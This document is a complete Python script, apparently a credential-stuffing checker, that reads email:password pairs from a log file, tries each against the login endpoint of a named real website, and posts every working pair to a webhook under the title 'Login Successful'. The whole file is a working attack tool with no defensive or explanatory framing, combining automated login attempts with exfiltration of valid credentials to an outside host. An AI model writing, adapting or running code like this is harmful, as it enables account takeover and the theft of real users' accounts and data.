import requests
import json

def send_webhook(email, password):
    webhook_url = "WEBHOOK"
    embed = {
        "title": "Login Successful",
        "description": f"**Email:** {email}\n**Password:** {password}",
        "color": 3066993  
    }

    data = {
        "embeds": [embed]
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, json=data, headers=headers)
    if response.status_code == 204:
        print("Webhook sent successfully.")
    else:
        print(f"Failed to send webhook: {response.status_code}")

def check_account(email, password):
    aurl = "https://www.smsonay.com/ajax/login"
    
    payload = {
        "email": email,
        "password": password,
    }

    asf = requests.post(aurl, data=payload)
    
    try:
        response_json = asf.json()

        if response_json["success"]:
            print(f"Login successful for {email}!")
            send_webhook(email, password)
        else:
            title = response_json["title"].encode('utf-8').decode('unicode_escape')
            message = response_json["message"].encode('utf-8').decode('unicode_escape')
            print(f"Error Login for {email}: {title} - {message}")
    except json.JSONDecodeError:
        print(f"Failed to decode response for {email}")

with open('log.txt', 'r') as file:
    for line in file:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':')
            check_account(email, password)
